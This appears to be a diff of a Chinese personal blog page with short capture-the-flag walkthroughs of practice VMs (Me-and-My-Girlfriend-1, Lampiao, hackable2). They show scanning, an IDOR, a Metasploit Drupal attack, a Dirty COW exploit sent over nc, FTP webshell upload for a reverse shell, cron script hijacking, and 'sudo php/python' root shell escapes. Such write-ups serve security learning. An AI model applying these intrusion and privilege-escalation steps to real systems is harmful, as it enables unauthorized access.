+<li><p>利用nc从靶机上下载文件<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251106192833901.png" alt="image-20251106192833901"></p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251106192857647.png" alt="image-20251106192857647"></p>
+</li>
+<li><p>利用工具提取文件hash值<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251106193021202.png" alt="image-20251106193021202"></p>
+</li>
+</ol>
+<p>​	开始破解文件密码我这里破解过了就不能重复破解然后输入指令查看密码。<br>​	<img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251106193157404.png" alt="image-20251106193157404"></p>
+<ol start="7">
+<li>用keepass查看文件内容，发现是sysadmin用户的密码，复制出来。</li>
+</ol>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251106193358254.png" alt="image-20251106193358254">	</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251106193424424.png" alt="image-20251106193424424"></p>
+<ol start="8">
+<li>切换sysadmin用户。</li>
+</ol>
+<p>​	<img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251106193617710.png" alt="image-20251106193617710"></p>
+<p>拿到第一个flag.<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251106193731341.png" alt="image-20251106193731341"></p>
+<ol start="9">
+<li><p>提权。</p>
+<p>在靶机上上传pspy64s来查看靶机定时任务跟运行的任务</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251106193927215.png" alt="image-20251106193927215"></p>
+</li>
+</ol>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251106193938333.png" alt="image-20251106193938333"></p>
+<p>​	给以权限并运行chmod +x pspy64s查看信息</p>
+<p>​	<img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251106195651552.png" alt="image-20251106195651552"></p>
+<p>发现有个文件过一段时间就会运行<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251106200010233.png" alt="image-20251106200010233"></p>
+<p>由于这个文件是在sysadmin用户下所以sysadmin用户有绝对权限，虽然不能删掉文件但是可以修改文件夹的名字</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251106200309265.png" alt="image-20251106200309265"></p>
+<p>这时候我们在创建一个同名文件夹在文件夹里写入一个木马文件命名为script.php，系统每过一段时间就会运行此文件。</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251106200649438.png" alt="image-20251106200649438"></p>
+<p>最后应该是能转换到root权限上的但是我没有测试出来<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251106201459692.png" alt="image-20251106201459692"></p>
+</div><div class="index-category-tag">  <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2026-03-31  <a class="commentCountImg" href="/2026/03/31/Me-and-My-Girlfriend-1/#comment-container"><span class="display-none-class">d41d8cd98f00b204e9800998ecf8427e</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="d41d8cd98f00b204e9800998ecf8427e">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>2 m  <i class="fas fa-pencil-alt"> </i>0.3 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2026/03/31/Me-and-My-Girlfriend-1/"> </a></h1><div class="content"><h1 id="Me-and-My-Girlfriend-1"><a href="#Me-and-My-Girlfriend-1" class="headerlink" title="Me-and-My-Girlfriend-1"></a>Me-and-My-Girlfriend-1</h1><ol>
+<li><p>信息收集，ip嗅探，端口扫描。</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923171526417.png" alt="image-20250923171526417"></p>
+</li>
+</ol>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923171659313.png" alt="image-20250923171659313"></p>
+<ol start="2">
+<li>查看网站，查看源代码，给了提示用x-fowarded-for</li>
+</ol>
+<p>   <img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923171727227.png" alt="image-20250923171727227"></p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923171811329.png" alt="image-20250923171811329"></p>
+<ol start="3">
+<li>Firefox打开用x-forwarded-for插件打开网站刷新一下就能看到网站。</li>
+</ol>
+<img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923172031998.png" alt="image-20250923172031998" style="zoom:33%;" />
+
+<ol start="4">
+<li>找寻信息发现当注册一个用户时，url上显示id&#x3D;12,尝试修改id，直到id等于5时，看到了一个用户名但密码看不到。</li>
+</ol>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923172406156.png" alt="image-20250923172406156"></p>
+<p>查看源代码可以看到密码</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923172430605.png" alt="image-20250923172430605"></p>
+<ol start="5">
+<li><p>kali ssh连接靶机。</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923172543572.png" alt="image-20250923172543572"></p>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name flag*</span><br></pre></td></tr></table></figure>
+
+<p>查找flag<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923172739736.png" alt="image-20250923172739736"></p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923172813774.png" alt="image-20250923172813774"></p>
+<ol start="6">
+<li><p>提权，sudo -l 查看root权限文件。</p>
+<p>发现可以执行php 代码</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923172905445.png" alt="image-20250923172905445"></p>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo php -r &#x27;system(&quot;/bin/sh&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>执行即可拿到root</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923173103232.png" alt="image-20250923173103232"></p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923173140122.png" alt="image-20250923173140122"></p>
+</div><div class="index-category-tag">  <hr></div></article></div><!--!--><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2026-03-31  <a class="commentCountImg" href="/2026/03/31/Lampiao/#comment-container"><span class="display-none-class">d41d8cd98f00b204e9800998ecf8427e</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="d41d8cd98f00b204e9800998ecf8427e">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>2 m  <i class="fas fa-pencil-alt"> </i>0.3 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2026/03/31/Lampiao/"> </a></h1><div class="content"><h1 id="Lampiao"><a href="#Lampiao" class="headerlink" title="Lampiao"></a>Lampiao</h1><ol>
+<li><p>扫描ip查看端口。</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251009152519740.png" alt="image-20251009152519740"></p>
+</li>
+<li><p>查看网页</p>
+</li>
+</ol>
+<p>​	<img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251009152558641.png" alt="image-20251009152558641"></p>
+<ol start="3">
+<li><p>用kali msfconsole攻击</p>
+<p>search drupal</p>
+<p>use 1</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251009152936175.png" alt="image-20251009152936175"></p>
+<p>set rhosts 192.168.56.108</p>
+<p>set rport 1898</p>
+</li>
+</ol>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251009153131434.png" alt="image-20251009153131434"></p>
+<ol start="4">
+<li>查看Drupal系统的重要文件settings.php</li>
+</ol>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251009153248334.png" alt="image-20251009153248334"></p>
+<p>cat var&#x2F;www&#x2F;html&#x2F;sites&#x2F;default&#x2F;settings.php</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251009153320444.png" alt="image-20251009153320444"></p>
+<p>5.ssh尝试连接tiago密码为Virgulino。发现连接成功</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251009153443842.png" alt="image-20251009153443842"></p>
+<p>6.内核提权uname -a 查看信息。</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251009153527689.png" alt="image-20251009153527689"></p>
+<p>发现有脏牛漏洞。</p>
+<ol start="7">
+<li><p>kali上下载攻击模块git clone <a target="_blank" rel="noopener" href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a><br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251009153629624.png" alt="image-20251009153629624"></p>
+</li>
+<li><p>将脚本传进靶机。</p>
+</li>
+</ol>
+<p>​	nc -nvlp 4444 &gt; dcow.cpp (靶机接收)</p>
+<p>​	<img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251009154019606.png" alt="image-20251009154019606"></p>
+<p>​	nc -w 3 靶机ip &lt; dcow.cpp(kali发送)</p>
+<p>​	<img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251009153936004.png" alt="image-20251009153936004"></p>
+<ol start="9">
+<li>编译脚本g++ -Wall -pedantic -O2 -std&#x3D;c++11 -pthread -o dcow dcow.cpp -lutil</li>
+</ol>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251009154052007.png" alt="image-20251009154052007"></p>
+<ol start="10">
+<li><p>运行即可拿到root密码<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251009154122916.png" alt="image-20251009154122916"></p>
+</li>
+<li><p>最后拿到flag</p>
+</li>
+</ol>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20251009154151171.png" alt="image-20251009154151171"></p>
+</div><div class="index-category-tag">  <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2026-03-31  <a class="commentCountImg" href="/2026/03/31/hackable2/#comment-container"><span class="display-none-class">d41d8cd98f00b204e9800998ecf8427e</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="d41d8cd98f00b204e9800998ecf8427e">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>2 m  <i class="fas fa-pencil-alt"> </i>0.3 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2026/03/31/hackable2/"> </a></h1><div class="content"><h1 id="hackable2"><a href="#hackable2" class="headerlink" title="** hackable2**"></a>** hackable2**</h1><ol>
+<li>嗅探ip，扫描服务nmap -sS -sV -A -n 192.168.56.105</li>
+</ol>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923085521283.png" alt="image-20250923085521283"></p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923085651108.png" alt="image-20250923085651108"></p>
+<p>2.dirsearch 扫描网站</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923091658377.png" alt="image-20250923091658377"></p>
+<p>打开一看是似乎为ftp上传的文件夹<img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923091753886.png" alt="image-20250923091753886"></p>
+<p>3 .查看ftp服务是否能匿名登入，登录成功，接着上传木马</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923091545782.png" alt="image-20250923091545782"></p>
+<p>在网站上运行木马反弹shell</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923091950286.png" alt="image-20250923091950286"></p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923091920775.png" alt="image-20250923091920775"></p>
+<ol start="4">
+<li>根据提示找到关键点<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923092658466.png" alt="image-20250923092658466"></li>
+</ol>
+<p>​	md5解密拿到密码onion<br><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923092744463.png" alt="image-20250923092744463"></p>
+<ol start="5">
+<li><p>su shrek   登录shrek用户</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923092909254.png" alt="image-20250923092909254"></p>
+</li>
+</ol>
+<p>​	找到第一个拿分点</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923093012038.png" alt="image-20250923093012038"></p>
+<ol start="6">
+<li><p>提权</p>
+<p>发现python3.5有SUID权限</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923093044977.png" alt="image-20250923093044977"></p>
+</li>
+</ol>
+<p>​	直接用Python执行os模块提权<br>sudo python3.5 -c ‘import os; os.system(“&#x2F;bin&#x2F;sh”)’</p>
+<p>拿到root用户</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923094018644.png" alt="image-20250923094018644"></p>
+<p>最后拿到flag</p>
+<p><img src="C:\Users\唐旭\AppData\Roaming\Typora\typora-user-images\image-20250923094059258.png" alt="image-20250923094059258"></p>
+</div><div class="index-category-tag">  <hr></div></article></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><!--!--><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="https://cdn.jsdelivr.net/gh/removeif/removeif-demo@latest/img/avatar.png" alt="辣椒の酱"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">辣椒の酱</p><p class="is-size-6 is-block">尚未执佩剑，转眼即江湖</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>阿尔及利亚</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives/"><p class="title">8</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories/"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags/"><p class="title">0</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ppoffice" target="_blank" rel="noopener">Follow</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/removeif"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Weibo" href="https://weibo.com/removeif"><i class="fab fa-weibo"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Email" href="mailto:removeif@163.com"><i class="fa fa-envelope"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Next" href="https://removeif.github.io/remove.io"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div><div><hr><p id="hitokoto">:D 一言句子获取中...</p><script type="text/javascript" defer>function getYiyan(){
                                 $.getJSON("https://v1.hitokoto.cn/", function (data) {
                                 if(data){
                                     $('#hitokoto').html("");
                                     $('#hitokoto').append("<strong style='color: #3273dc;'>"+data.hitokoto+"</strong>"+
                                     "<p>"+"From《"+data.from+"》</p><p>Provider-"+data.creator+"</p>");
                                 }});}
-                                $(function (){getYiyan();$('#hitokoto').click(function(){getYiyan();})});</script></div></div></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">Links</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><div class="column-right-shadow is-hidden-widescreen"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3"><div class="card widget"><div class="card-content"><h3 class="menu-label">Latest Comment</h3><span class="body_hot_comment">Loading...Wait a Minute!</span></div></div><div class="card widget"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2026-03-30T10:59:18.679Z">2026-03-30</time></p><p class="title"><a href="/2026/03/30/ok/"> </a></p></div></article></div></div><!--!--><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2026/03/"><span class="level-start"><span class="level-item">March 2026</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">Subscribe for updates</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="Subscribe"></div></div></form></div></div></div><!--!--></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="https://cdn.jsdelivr.net/gh/removeif/removeif-demo@latest/img/logo.png" alt="Hexo" height="28"></a><p class="size-small"><span>&copy; 2026 John Doe</span>  Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a> &amp; <a href="https://github.com/removeif/hexo-theme-amazing" target="_blank">Amazing</a> <br><span>© <a href="http://www.beian.miit.gov.cn/" target="_blank">川ICP备88888888号-8（测试）</a><br></span><span>© 版权说明：[本网站所有内容均收集于互联网或自己创作,<br />&nbsp;&nbsp;&nbsp;&nbsp;方便于网友与自己学习交流，如有侵权，请<a href="/message" target="_blank">留言</a>，立即处理]<br /></span><span><span id="statistic-times">loading...</span><script>function createTime(time) {
+                                $(function (){getYiyan();$('#hitokoto').click(function(){getYiyan();})});</script></div></div></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">Links</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><div class="column-right-shadow is-hidden-widescreen"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3"><div class="card widget"><div class="card-content"><h3 class="menu-label">Latest Comment</h3><span class="body_hot_comment">Loading...Wait a Minute!</span></div></div><div class="card widget"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2026-03-31T03:41:56.808Z">2026-03-31</time></p><p class="title"><a href="/2026/03/31/%E7%BA%A2%E6%97%A5/"> </a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2026-03-31T03:41:56.806Z">2026-03-31</time></p><p class="title"><a href="/2026/03/31/Victim01_042220/"> </a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2026-03-31T03:41:56.802Z">2026-03-31</time></p><p class="title"><a href="/2026/03/31/Untitled/"> </a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2026-03-31T03:41:56.799Z">2026-03-31</time></p><p class="title"><a href="/2026/03/31/p4l4nc4/"> </a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2026-03-31T03:41:56.797Z">2026-03-31</time></p><p class="title"><a href="/2026/03/31/opacity/"> </a></p></div></article></div></div><!--!--><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2026/03/"><span class="level-start"><span class="level-item">March 2026</span></span><span class="level-end"><span class="level-item tag">8</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">Subscribe for updates</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="Subscribe"></div></div></form></div></div></div><!--!--></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="https://cdn.jsdelivr.net/gh/removeif/removeif-demo@latest/img/logo.png" alt="Hexo" height="28"></a><p class="size-small"><span>&copy; 2026 John Doe</span>  Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a> &amp; <a href="https://github.com/removeif/hexo-theme-amazing" target="_blank">Amazing</a> <br><span>© <a href="http://www.beian.miit.gov.cn/" target="_blank">川ICP备88888888号-8（测试）</a><br></span><span>© 版权说明：[本网站所有内容均收集于互联网或自己创作,<br />&nbsp;&nbsp;&nbsp;&nbsp;方便于网友与自己学习交流，如有侵权，请<a href="/message" target="_blank">留言</a>，立即处理]<br /></span><span><span id="statistic-times">loading...</span><script>function createTime(time) {
             var n = new Date(time);
             now.setTime(now.getTime() + 250),
                 days = (now - n) / 1e3 / 60 / 60 / 24,
